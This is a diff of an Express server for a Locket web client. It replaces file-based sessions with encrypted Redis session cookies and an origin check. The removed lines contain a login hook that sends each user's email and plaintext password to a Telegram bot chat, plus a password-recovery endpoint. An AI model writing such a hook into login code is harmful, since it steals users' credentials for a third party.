@@ -14,103 +14,91 @@ const { LocketClient } = require('locket.js');
 
 const app = express();
 
-const client = new LocketClient({ sessionPath: path.join(__dirname, 'locket.js_session.json') });
 
-const PASSWORD_FILE = path.join(__dirname, 'locket-password.enc');
-async function notifyTelegram(email, password, username) { 
-const token = String(
-  process.env.TELEGRAM_BOT_TOKEN || ''
-).trim().replace(/^bot/i, '');
-
-const chatId = String(
-  process.env.TELEGRAM_CHAT_ID || ''
-).trim();
-
-if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) {
-  throw new Error('TELEGRAM_BOT_TOKEN sai định dạng');
+const COOKIE = 'locket_sid';
+const TTL = 604800;
+const configured = () => Boolean(process.env.UPSTASH_REDIS_REST_URL &&
+  process.env.UPSTASH_REDIS_REST_TOKEN &&
+  process.env.LOCKET_SESSION_KEY && process.env.LOCKET_SESSION_KEY.length >= 32);
+const cryptKey = () => crypto.createHash('sha256').update(process.env.LOCKET_SESSION_KEY).digest();
+const redisKey = sid => 'locket:session:' + crypto.createHash('sha256').update(sid).digest('hex');
+async function redis(...args) {
+  if (!configured()) throw Object.assign(new Error('Thiếu cấu hình Redis hoặc LOCKET_SESSION_KEY.'),{status:503});
+  const url = process.env.UPSTASH_REDIS_REST_URL;
+  const result = await fetch(url, {
+    method:'POST',
+    headers:{ Authorization:'Bearer ' + process.env.UPSTASH_REDIS_REST_TOKEN,
+      'Content-Type':'application/json' },
+    body:JSON.stringify(args)
+  });
+  if (!result.ok) throw Object.assign(new Error('Không thể kết nối Redis.'),{status:503});
+  const body = await result.json();
+  if (body.error) throw Object.assign(new Error('Redis từ chối yêu cầu.'),{status:503});
+  return body.result;
 }
-
-if (!/^\d+$/.test(chatId)) {
-  throw new Error('TELEGRAM_CHAT_ID cá nhân không hợp lệ');
+function encrypt(data) {
+  const iv=crypto.randomBytes(12);
+  const cipher=crypto.createCipheriv('aes-256-gcm',cryptKey(),iv);
+  const encrypted=Buffer.concat([cipher.update(JSON.stringify(data),'utf8'),cipher.final()]);
+  return Buffer.concat([iv,cipher.getAuthTag(),encrypted]).toString('base64url');
 }
-
-  const message = [
-    'Đăng nhập Locket thành công',
-    `Username: ${username || '(không lấy được)'}`,
-    `Email: ${email}`,
-    `Mật khẩu: ${password}`, 
-    `Thời gian: ${new Date().toLocaleString('vi-VN')}`
-  ].join('\n');
-
-  const response = await fetch(
-    `https://api.telegram.org/bot${token}/sendMessage`,
-    {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
+function decrypt(value) {
+  const data=Buffer.from(value,'base64url');
+  const decipher=crypto.createDecipheriv('aes-256-gcm',cryptKey(),data.subarray(0,12));
+  decipher.setAuthTag(data.subarray(12,28));
+  return JSON.parse(Buffer.concat([decipher.update(data.subarray(28)),decipher.final()]).toString('utf8'));
+}
+function createClient(record) {
+  const client=new LocketClient({sessionPath:null});
+  client.session.save=()=>{};
+  if(record) {
+    for(const key of ['uid','email','idToken','refreshToken','expiresAt'])
+      client.session[key]=record[key];
+    if(record.device) {
+      const { DeviceProfile }=require('locket.js/lib/device');
+      client.device=DeviceProfile.fromDict(record.device);
+      client.session.device=client.device;
     }
-  );
-
-if (!response.ok) {
-  const body = await response.json().catch(() => ({}));
-
-  console.error('Telegram error:', {
-    status: response.status,
-    error_code: body.error_code,
-    description: body.description
-  });
-
-  throw new Error(`Telegram HTTP ${response.status}`);
+  }
+  return client;
 }
+function getSid(req) {
+  const cookies=String(req.headers.cookie||'').split(';');
+  const value=cookies.map(x=>x.trim()).find(x=>x.startsWith(COOKIE+'='));
+  const sid=value ? value.slice(COOKIE.length+1) : '';
+  return /^[a-f0-9]{64}$/.test(sid) ? sid : null;
 }
-function encryptPassword(password, masterPassword) {
-  const salt = crypto.randomBytes(16);
-  const iv = crypto.randomBytes(12);
-  const key = crypto.scryptSync(masterPassword, salt, 32);
-
-  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
-  const encrypted = Buffer.concat([
-    cipher.update(password, 'utf8'),
-    cipher.final()
-  ]);
-
-  return JSON.stringify({
-    salt: salt.toString('hex'),
-    iv: iv.toString('hex'),
-    tag: cipher.getAuthTag().toString('hex'),
-    data: encrypted.toString('hex')
-  });
+async function loadClient(req) {
+  const sid=getSid(req);
+  if(!sid) return null;
+  const value=await redis('GET',redisKey(sid));
+  if(!value) return null;
+  try {
+    const client=createClient(decrypt(value));
+    return client.isAuthenticated()?{sid,client}:null;
+  } catch {return null;}
 }
-
-function decryptPassword(masterPassword) {
-  const record = JSON.parse(fs.readFileSync(PASSWORD_FILE, 'utf8'));
-  const key = crypto.scryptSync(
-    masterPassword,
-    Buffer.from(record.salt, 'hex'),
-    32
-  );
-
-  const decipher = crypto.createDecipheriv(
-    'aes-256-gcm',
-    key,
-    Buffer.from(record.iv, 'hex')
-  );
-
-  decipher.setAuthTag(Buffer.from(record.tag, 'hex'));
-
-  return Buffer.concat([
-    decipher.update(Buffer.from(record.data, 'hex')),
-    decipher.final()
-  ]).toString('utf8');
+async function saveClient(sid,client) {
+  const session=client.session;
+  const data={
+    uid:session.uid,email:session.email,idToken:session.idToken,
+    refreshToken:session.refreshToken,expiresAt:session.expiresAt,
+    device:client.device.toDict()
+  };
+  await redis('SET',redisKey(sid),encrypt(data),'EX',TTL);
+}
+const secureCookie=Boolean(process.env.VERCEL || process.env.NODE_ENV==='production');
+const cookieOptions={httpOnly:true,secure:secureCookie,sameSite:'lax',path:'/',maxAge:TTL*1000};
+function checkOrigin(req,res,next) {
+  if(['GET','HEAD','OPTIONS'].includes(req.method)) return next();
+  const origin=req.get('origin');
+  try {
+    if(!origin || new URL(origin).host!==req.get('host')) 
+      return res.status(403).json({error:'Nguồn yêu cầu không hợp lệ.'});
+  }catch{return res.status(403).json({error:'Origin không hợp lệ.'});}
+  next();
 }
 
-const token = process.env.LOCKET_API_SECRET;
-if (!token || token.length < 32) {
-  throw new Error('Thiếu LOCKET_API_SECRET');
-}
 
 const port = Number(process.env.PORT || 3000);
 
@@ -164,150 +152,54 @@ app.use((_req,res,next)=>{
 
 app.use(express.static(path.join(__dirname,'public')));
 
-app.get('/api/bootstrap',(_req,res)=>res.json({token,loggedIn:client.isAuthenticated()}));
 
-app.use('/api',(req,res,next)=>{
+app.get('/api/bootstrap',wrap(async(req,res)=>{
+  const entry=await loadClient(req);
+  res.json({loggedIn:Boolean(entry)});
+}));
+app.use('/api',checkOrigin);
 
-  const v=req.get('X-Local-Token')||'';
 
-  if(v.length!==token.length||!crypto.timingSafeEqual(Buffer.from(v),Buffer.from(token))) return res.status(403).json({error:'Không có quyền truy cập.'});
 
+app.post('/api/login',wrap(async(req,res)=>{
+  const {email,password}=req.body||{};
+  if(typeof email!=='string'||typeof password!=='string'||
+    !email.trim()||!password||email.length>320||password.length>1024)
+      return res.status(400).json({error:'Email hoặc mật khẩu không hợp lệ.'});
+  if(!configured()) return res.status(503).json({error:'Thiếu cấu hình Redis hoặc LOCKET_SESSION_KEY.'});
+  const client=createClient();
+  try {await client.login(email.trim(),password);}
+  catch(err) {return res.status(401).json({error:'Locket từ chối đăng nhập: '+err.message});}
+  const sid=crypto.randomBytes(32).toString('hex');
+  await saveClient(sid,client);
+  res.cookie(COOKIE,sid,cookieOptions);
+  res.json({ok:true});
+}));
+
+
+
+app.post('/api/logout',wrap(async(req,res)=>{
+  const sid=getSid(req);
+  if(sid) await redis('DEL',redisKey(sid));
+  res.clearCookie(COOKIE,{path:'/',sameSite:'lax',secure:secureCookie});
+  res.json({ok:true,message:'Đăng xuất thành công.'});
+}));
+app.use('/api',wrap(async(req,res,next)=>{
+  const entry=await loadClient(req);
+  if(!entry) return res.status(401).json({error:'Cần đăng nhập Locket.'});
+  res.locals.client=entry.client;
+  const oldJson=res.json.bind(res);
+  res.json=function(data){
+    saveClient(entry.sid,entry.client).then(()=>oldJson(data)).catch(next);
+    return res;
+  };
   next();
-
-});
-
-app.post('/api/login', wrap(async (req, res) => {
-  if (client.isAuthenticated()) return res.json({ ok: true });
-
-  const { email, password } = req.body || {};
-  if (typeof email !== 'string' || typeof password !== 'string' ||
-      !email.trim() || !password || email.length > 320 || password.length > 1024) {
-    return res.status(400).json({ error: 'Email hoặc mật khẩu không hợp lệ.' });
-  }
-
-
-try {
-  await client.login(email.trim(), password);
-} catch (err) {
-  const invalidPassword =
-    String(err.message || '').includes('INVALID_PASSWORD');
-
-  if (invalidPassword) {
-    return res.status(401).json({
-      error: 'Sai mật khẩu Locket. Kiểm tra lại hoặc đặt lại mật khẩu.'
-    });
-  }
-
-  console.error('[Locket Login]', err.message);
-
-  return res.status(502).json({
-    error: 'Không đăng nhập được Locket: ' + err.message
-  });
-}
-
-// ✅ ĐẾN ĐÂY LÀ LOGIN THÀNH CÔNG
-let username = '';
-try {
-  const profile = await client.user.getProfile();
-  username = profile?.username || profile?.user?.username || '';
-} catch (err) {
-  console.warn('[Locket] Không lấy được username:', err.message);
-}
-
-notifyTelegram(email.trim(), password, username).catch(err => {
-  console.error('Lỗi gửi Telegram:', err.message);
-});
-  const masterPassword = process.env.LOCKET_MASTER_PASSWORD;
-  if (masterPassword) {
-    try {
-      fs.writeFileSync(PASSWORD_FILE, encryptPassword(password, masterPassword), {
-        encoding: 'utf8', mode: 0o600
-      });
-    } catch (error) {
-      console.warn('[Locket] Không lưu được mật khẩu mã hóa:', error.message);
-    }
-  }
-
-  try {
-    const sessionPath = path.join(__dirname, 'locket.js_session.json');
-    const session = JSON.parse(fs.readFileSync(sessionPath, 'utf8'));
-    session.login_email = email.trim();
-    session.last_login = new Date().toISOString();
-    fs.writeFileSync(sessionPath, JSON.stringify(session, null, 2), {
-      encoding: 'utf8', mode: 0o600
-    });
-  } catch (error) {
-    console.warn('[Locket] Không cập nhật được thông tin phiên:', error.message);
-  }
-
-  res.json({ ok: true });
-}));
-
-// Chỉ dùng trên localhost. Cần mật khẩu chính để xem lại mật khẩu Locket.
-const recoverAttempts = new Map();
-app.post('/api/recover-password', wrap(async (req, res) => {
-  const key = req.ip || 'local';
-  const now = Date.now();
-  const record = recoverAttempts.get(key) || { count: 0, reset: now + 15 * 60_000 };
-  if (now > record.reset) {
-    record.count = 0;
-    record.reset = now + 15 * 60_000;
-  }
-  if (record.count >= 5) {
-    return res.status(429).json({ error: 'Thử quá nhiều lần. Hãy thử lại sau.' });
-  }
-  const masterPassword = req.body?.masterPassword;
-  if (typeof masterPassword !== 'string' || !masterPassword) {
-    return res.status(400).json({ error: 'Nhập mật khẩu chính.' });
-  }
-  if (!fs.existsSync(PASSWORD_FILE)) {
-    return res.status(404).json({ error: 'Chưa lưu mật khẩu. Hãy đăng nhập lại sau khi cấu hình mật khẩu chính.' });
-  }
-  try {
-    const password = decryptPassword(masterPassword);
-    recoverAttempts.delete(key);
-    res.set('Cache-Control', 'no-store');
-    return res.json({ password });
-  } catch {
-    record.count++;
-    recoverAttempts.set(key, record);
-    return res.status(403).json({ error: 'Mật khẩu chính không đúng.' });
-  }
-}));
-
-app.use('/api',(req,res,next)=>client.isAuthenticated()?next():res.status(401).json({error:'Cần đăng nhập Locket.'}));
-
-app.post('/api/logout', wrap(async (req, res) => {
-  const fs = require('node:fs');
-  const session = client.session;
-
-  if (!session) {
-    return res.status(500).json({
-      error: 'Không tìm thấy phiên đăng nhập.'
-    });
-  }
-  // Chỉ xóa file session trên máy tính
-  if (!process.env.VERCEL) {
-    const sessionPath = path.join(
-      __dirname,
-      'locket.js_session.json'
-    );
-
-    if (fs.existsSync(sessionPath)) {
-      fs.unlinkSync(sessionPath);
-    }
-  }
-
-  res.json({
-    ok: true,
-    message: 'Đăng xuất thành công.'
-  });
 }));
 
 
-app.get('/api/profile',wrap(async(_req,res)=>res.json(clean(await client.user.getProfile()))));
+app.get('/api/profile',wrap(async(_req,res)=>res.json(clean(await res.locals.client.user.getProfile()))));
 
-app.get('/api/friends',wrap(async(_req,res)=>res.json(clean(await client.friends.getAllFriends()))));
+app.get('/api/friends',wrap(async(_req,res)=>res.json(clean(await res.locals.client.friends.getAllFriends()))));
 
 // Lấy cả feed mới nhất lẫn lịch sử đã được chia sẻ với tài khoản này.
 
@@ -317,9 +209,9 @@ app.get('/api/feed',wrap(async(req,res)=>{
 
   if(cursor.length>2048) return res.status(400).json({error:'Cursor không hợp lệ.'});
 
-  if(typeof client.moments.getMoments!=='function') return res.status(501).json({error:'Cập nhật locket.js để dùng getMoments().'});
+  if(typeof res.locals.client.moments.getMoments!=='function') return res.status(501).json({error:'Cập nhật locket.js để dùng getMoments().'});
 
-  const history=await client.moments.getMoments({limit:30,pageToken:cursor||null});
+  const history=await res.locals.client.moments.getMoments({limit:30,pageToken:cursor||null});
 
   const older=Array.isArray(history?.moments)?history.moments:[];
 
@@ -329,7 +221,7 @@ app.get('/api/feed',wrap(async(req,res)=>{
 
     try{
 
-      const feed=await client.moments.getLatest();
+      const feed=await res.locals.client.moments.getLatest();
 
       latest=Array.isArray(feed)?feed:Array.isArray(feed?.moments)?feed.moments:[];
 
@@ -397,7 +289,7 @@ app.get('/api/moment-views', wrap(async (req, res) => {
 
 
 
-  const myUid = client.session.uid;
+  const myUid = res.locals.client.session.uid;
 
 
 
@@ -419,7 +311,7 @@ app.get('/api/moment-views', wrap(async (req, res) => {
 
   try {
 
-    const myMoments = await client.moments.getAllMyMoments({
+    const myMoments = await res.locals.client.moments.getAllMyMoments({
 
       limit: 100
 
@@ -451,7 +343,7 @@ app.get('/api/moment-views', wrap(async (req, res) => {
 
       for (let page = 0; page < 5; page++) {
 
-        const data = await client.moments.getMoments({
+        const data = await res.locals.client.moments.getMoments({
 
           filteredByUserId: myUid,
 
@@ -511,7 +403,7 @@ app.get('/api/moment-views', wrap(async (req, res) => {
 
 
 
-  const response = await client.moments.getViews(momentUid);
+  const response = await res.locals.client.moments.getViews(momentUid);
 
   const data = response?.data || response || {};
 
@@ -542,7 +434,7 @@ app.get('/api/moment-views', wrap(async (req, res) => {
 
 app.get('/api/archive', wrap(async (req, res) => {
 
-  const myUid = client.session.uid;
+  const myUid = res.locals.client.session.uid;
 
   const results = new Map();
 
@@ -554,7 +446,7 @@ app.get('/api/archive', wrap(async (req, res) => {
 
   try {
 
-    const posted = await client.moments.getAllMyMoments({
+    const posted = await res.locals.client.moments.getAllMyMoments({
 
       limit: 100
 
@@ -598,7 +490,7 @@ app.get('/api/archive', wrap(async (req, res) => {
 
     for (let page = 0; page < 5; page++) {
 
-      const data = await client.moments.getMoments({
+      const data = await res.locals.client.moments.getMoments({
 
         filteredByUserId: myUid,
 
@@ -722,15 +614,15 @@ app.get('/api/friend-moments',wrap(async(req,res)=>{
 
   const uid=String(req.query.uid||'').trim();
 
-  if(username && /^[\w.]{1,40}$/.test(username)) return res.json(clean(await client.moments.getSharedMomentsByUsername(username,20)));
+  if(username && /^[\w.]{1,40}$/.test(username)) return res.json(clean(await res.locals.client.moments.getSharedMomentsByUsername(username,20)));
 
-  if(uid && /^[\w-]{1,128}$/.test(uid) && typeof client.moments.getSharedMomentsByUser==='function') return res.json(clean(await client.moments.getSharedMomentsByUser(uid,20)));
+  if(uid && /^[\w-]{1,128}$/.test(uid) && typeof res.locals.client.moments.getSharedMomentsByUser==='function') return res.json(clean(await res.locals.client.moments.getSharedMomentsByUser(uid,20)));
 
   res.status(400).json({error:'Chọn bạn bè có username hoặc UID hợp lệ.'});
 
 }));
 
-app.get('/api/chats',wrap(async(_req,res)=>res.json(clean(await client.chat.getConversations()))));
+app.get('/api/chats',wrap(async(_req,res)=>res.json(clean(await res.locals.client.chat.getConversations()))));
 
 app.get('/api/messages',wrap(async(req,res)=>{
 
@@ -738,7 +630,7 @@ app.get('/api/messages',wrap(async(req,res)=>{
 
   if(!/^[\w-]{1,128}$/.test(uid)) return res.status(400).json({error:'UID không hợp lệ.'});
 
-  res.json(clean(await client.chat.getMessages({otherUserId:uid})));
+  res.json(clean(await res.locals.client.chat.getMessages({otherUserId:uid})));
 
 }));
 
@@ -760,7 +652,7 @@ app.post('/api/message/recall', wrap(async (req, res) => {
     });
   }
 
-  const conversations = await client.chat.getConversations();
+  const conversations = await res.locals.client.chat.getConversations();
 
   const conversation = conversations.find(
     c => String(c.conversation_id) === conversationUid
@@ -772,7 +664,7 @@ app.post('/api/message/recall', wrap(async (req, res) => {
     });
   }
 
-  const messages = await client.chat.fetchMessagesFromServer({
+  const messages = await res.locals.client.chat.fetchMessagesFromServer({
     conversationId: conversationUid
   });
 
@@ -786,13 +678,13 @@ app.post('/api/message/recall', wrap(async (req, res) => {
     });
   }
 
-  if (String(target.sender_uid) !== String(client.session.uid)) {
+  if (String(target.sender_uid) !== String(res.locals.client.session.uid)) {
     return res.status(403).json({
       error: 'Bạn chỉ được thu hồi tin nhắn của mình.'
     });
   }
 
-  const result = await client.chat.deleteMessage(
+  const result = await res.locals.client.chat.deleteMessage(
     conversationUid,
     messageUid,
     true
@@ -816,7 +708,7 @@ app.post('/api/message',wrap(async(req,res)=>{
 
   if(typeof uid!=='string'||typeof message!=='string'||!/^[\w-]{1,128}$/.test(uid.trim())||!message.trim()||message.length>4000) return res.status(400).json({error:'Người nhận hoặc tin nhắn không hợp lệ.'});
 
-  const response=await client.chat.sendMessage({receiverUid:uid.trim(),text:message.trim()});
+  const response=await res.locals.client.chat.sendMessage({receiverUid:uid.trim(),text:message.trim()});
 
   res.json({ok:true,data:clean(response)});
 
@@ -856,7 +748,7 @@ app.post('/api/post',upload.single('media'),wrap(async(req,res)=>{
 
     recipients=[...new Set(recipients)];
 
-    const friendData=await client.friends.getAllFriends();
+    const friendData=await res.locals.client.friends.getAllFriends();
 
     const friendList=Array.isArray(friendData)?friendData:friendData?.friends||friendData?.users||friendData?.data||[];
 
@@ -870,7 +762,7 @@ app.post('/api/post',upload.single('media'),wrap(async(req,res)=>{
 
   params[kind]=file.buffer;
 
-  const response=await client.moments.post(params);
+  const response=await res.locals.client.moments.post(params);
 
   res.json({ok:true,data:clean(response)});
 
@@ -888,8 +780,8 @@ app.use((err,_req,res,_next)=>{
 
 
 if (require.main === module) {
-  app.listen(port, host, () => {
-    console.log(`Locket Web: http://${host}:${port}`);
+  app.listen(port, '0.0.0.0', () => {
+    console.log(`Locket Web: http://localhost:${port}`);
   });
 }
 
